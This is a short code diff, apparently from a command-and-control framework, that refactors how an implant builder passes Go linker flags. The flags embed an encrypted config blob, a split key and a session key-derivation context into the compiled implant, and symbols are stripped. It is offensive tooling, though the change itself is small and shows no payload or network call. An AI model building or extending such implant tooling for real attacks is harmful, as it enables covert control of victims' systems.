@@ -16,11 +16,28 @@ import sys
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
 
+from core.c2.protocol import C2_SESSION_KDF_CONTEXT
+
 C_GREEN  = "\033[92m"
 C_YELLOW = "\033[93m"
 C_RED    = "\033[91m"
 C_CYAN   = "\033[96m"
 C_RESET  = "\033[0m"
+
+
+def _go_linker_flags(
+    config_blob: str,
+    key_part1: str,
+    key_part2: str,
+) -> str:
+    """Serialize build-time values, including the canonical wire context."""
+    session_context = C2_SESSION_KDF_CONTEXT.decode("ascii")
+    return (
+        f"-s -w -X 'main.EncBlob={config_blob}' "
+        f"-X 'main.KP1={key_part1}' "
+        f"-X 'main.KP2={key_part2}' "
+        f"-X 'main.SessionKDFContext={session_context}'"
+    )
 
 def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
     """Return the raw 32-byte X25519 public key as base64."""
@@ -108,7 +125,7 @@ def build_implant(
     key_part2 = hex_key[32:]
     
     # Setup ldflags to inject the encrypted blob and split keys
-    ldflags = f"-s -w -X 'main.EncBlob={config_blob}' -X 'main.KP1={key_part1}' -X 'main.KP2={key_part2}'"
+    ldflags = _go_linker_flags(config_blob, key_part1, key_part2)
     
     env = os.environ.copy()
     env["GOOS"] = os_target
